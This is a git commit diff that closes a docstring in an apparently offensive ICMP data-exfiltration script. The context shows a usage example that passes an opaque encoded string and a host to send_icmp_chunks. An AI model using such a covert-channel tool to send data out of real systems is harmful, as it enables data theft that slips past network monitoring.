3bce2ead23ca7a7bd257d04274125e59411a6b21
Subinacls <admin@hacker-island.com>
2024-02-08 22:03:08 -0500

    Update ICMP_Sender.py

--- python3/ICMP/EXFIL/ICMP_Sender.py
+++ python3/ICMP/EXFIL/ICMP_Sender.py
@@ -19,6 +19,7 @@ def send_icmp_chunks(host, string):
       string = "mko8UMkmzx2CjbzKEh03t7CGewYNFZp6NPoU84QkrcLoCL4N1VEdK+fNaTcXF12tlx5rvcZPpqZ7TWGOX5IAL+r/l8hDYzUuvzDDVVWXtP8ehcXHoxAQbiR+b1PJrJ5KslfjEiR0qIz28uMTL0NT8C+OsPSbWTPLDD1L4ZFH2hw6U9BUm0Vt5fkKe5oLsYBkyIHb4M+ujVc18WRS6YXCWQxBTlxlU/jaO+XABfjPFFQ2ybv+8u6ViboONAIcKjDlRnOelPx+t8OYkNBLomBIchxD4jAh0qGqsKqNj71OyBNRitS5SkpB45JHVWMKstoaUTu4hyLx0UxppdHEBK01wAtja9bRCSzi"
     Execute the function with the host and string argument
       send_icmp_chunks(host, string)
+"""
 
 
 
